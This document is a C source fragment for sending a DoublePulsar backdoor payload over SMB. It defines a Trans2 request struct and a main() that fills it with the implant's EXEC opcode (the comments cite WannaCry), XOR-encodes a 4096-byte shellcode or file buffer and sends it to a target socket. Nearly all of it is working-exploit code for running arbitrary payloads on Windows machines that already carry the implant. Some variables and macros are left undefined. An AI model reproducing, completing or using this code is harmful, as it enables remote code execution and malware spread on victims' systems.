typedef struct {
	uint16_t SmbMessageType; //0x00
	uint16_t SmbMessageLength;
	uint8_t ProtocolHeader[4]; //"\xffSMB"
	uint8_t SmbCommand;
	uint32_t NtStatus; //0x00000000
	uint8_t flags = 0x18; //0x18 - pathnames not case sensitive & pathnames canonicalized
	uint16_t flags2;  //0xC007
	uint16_t ProcessIDHigh; //0x00
	uint8_t signature[8]; //0x00000000000
	uint16_t reserved; //0x0000
	uint16_t TreeId;                     //tree ID must be set
	uint16_t ProcessID; //0xfeff
	uint16_t UserID;
	uint16_t multipleID;                 //must have a multiplex ID

	//trans2 stuff
	uint8_t wordCount;              //setupcount(1) + wordcount (14)
	uint16_t totalParameterCount;
	uint16_t totalDataCount;
	uint16_t MaxParameterCount;
	uint16_t MaxDataCount;
	uint8_t MaxSetupCount;

	uint8_t reserved1;
	uint16_t flags1;
	uint32_t timeout;
	uint16_t reserved2;

	uint16_t ParameterCount;
	uint16_t ParamOffset;

	uint16_t DataCount;
	uint16_t DataOffset;
	uint8_t SetupCount;

	uint8_t reserved3;
	uint16_t subcommand; //0x0e00 also known as Subcommand in Wireshark
	uint16_t ByteCount; //4109 or 0x0d 0x10
	uint8_t padding;

	//char SESSION_SETUP_PARAMETERS[12];
	char SMB_DATA[4108];
} SMB_DOUBLEPULSAR_REQUEST;


main()
{
	//set SMB values
	SMB_DOUBLEPULSAR_REQUEST uploadpacket;

	uploadpacket.SmbMessageType = 0x0000;
	uploadpacket.ProtocolHeader[0] = '\xff';
	uploadpacket.ProtocolHeader[1] = 'S';
	uploadpacket.ProtocolHeader[2] = 'M';
	uploadpacket.ProtocolHeader[3] = 'B';
	uploadpacket.SmbCommand = 0x32; //Trans2 
	uploadpacket.SmbMessageLength = SWAP_SHORT(0x4e);
	uploadpacket.ProcessIDHigh = 0x0000;
	uploadpacket.NtStatus = 0x00000000;
	uploadpacket.flags = 0x18;
	uploadpacket.flags2 = 0xc007;
	uploadpacket.UserID = userid; 	//grab from SMB response


	uploadpacket.reserved = 0x0000;
	uploadpacket.ProcessID = 0xfeff; //treeresponse.ProcessID;   //treeresponse.ProcessID; //Default value:  0xfeff;
	uploadpacket.TreeId = treeresponse.TreeId;	//grab from SMB response
	uploadpacket.multipleID = 0x41;

	//trans2 packet stuff
	uploadpacket.wordCount = 15; // 0x0F == 15 
	uploadpacket.totalParameterCount = 0x0C; // should be 12
	uploadpacket.totalDataCount = SWAP_SHORT(0x0000); // should be 0

	uploadpacket.MaxParameterCount = SWAP_SHORT(0x0100); // should be 1
	uploadpacket.MaxDataCount = SWAP_SHORT(0x0000); // should be 0
	uploadpacket.MaxSetupCount = SWAP_SHORT(0);     //should be 0
	uploadpacket.reserved1 = SWAP_SHORT(0);
	uploadpacket.flags1 = 0x0000;

	//trying little endian format for timeout
	uploadpacket.timeout = SWAP_WORD(0x001a8925); //0x25 0x89 0x1a 0x00 EXEC command from Wannacry
	//uploadpacket.timeout = SWAP_WORD(0x0134ee00);    //little endian PING command from Wannacry
	//0x866c3100 = PING command from somewhere else

	uploadpacket.reserved2 = SWAP_SHORT(0x0000);                 //should be 0x0000
	uploadpacket.ParameterCount = 0x0C;         //should be 12
	uploadpacket.ParamOffset= 0x0042;          //should be 66
	uploadpacket.DataCount = SWAP_SHORT(0x000);          //should be 0 -> 0x0000
	uploadpacket.DataOffset = 0x004e;           //should be 78
	uploadpacket.SetupCount = 1;						//should be 1 / 0x01
	uploadpacket.reserved3 = 0x00;						//should be 0x00
	uploadpacket.subcommand = 0x000e;         //original 0x0e00 ( little endian format )
	uploadpacket.ByteCount = 0xD;          //value should be 13
	uploadpacket.padding = SWAP_SHORT(0x00);			//should be 0x00

	uploadpacket.signature[0] = '\0';
	uploadpacket.signature[1] = '\0';
	uploadpacket.signature[2] = '\0';
	uploadpacket.signature[3] = '\0';
	uploadpacket.signature[4] = '\0';
	uploadpacket.signature[5] = '\0';
	uploadpacket.signature[6] = '\0';
	uploadpacket.signature[7] = '\0';

	char Parametersbuffer[13];
	unsigned int TotalSizeOfPayload = 4096 ^ XorKey;
	unsigned int ChunkSize = 4096 ^ XorKey;
	unsigned int OffsetofChunkinPayload = 0 ^ XorKey;

	memcpy(Parametersbuffer, (char*)&TotalSizeOfPayload, 4);
	memcpy(Parametersbuffer + 4, (char*)&ChunkSize, 4);
	memcpy(Parametersbuffer + 8, (char*)&OffsetofChunkinPayload, 4);

	memcpy(uploadpacket.SMB_DATA, Parametersbuffer, 12);
	memcpy(uploadpacket.SMB_DATA + 12, SHELLCODE_OR_FILE_BUFFER, 4096);
	xor_payload(XorKey, uploadpacket.SMB_DATA, 4108);

	send(sock, (char*)&uploadpacket, sizeof(uploadpacket), 0);
	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
}


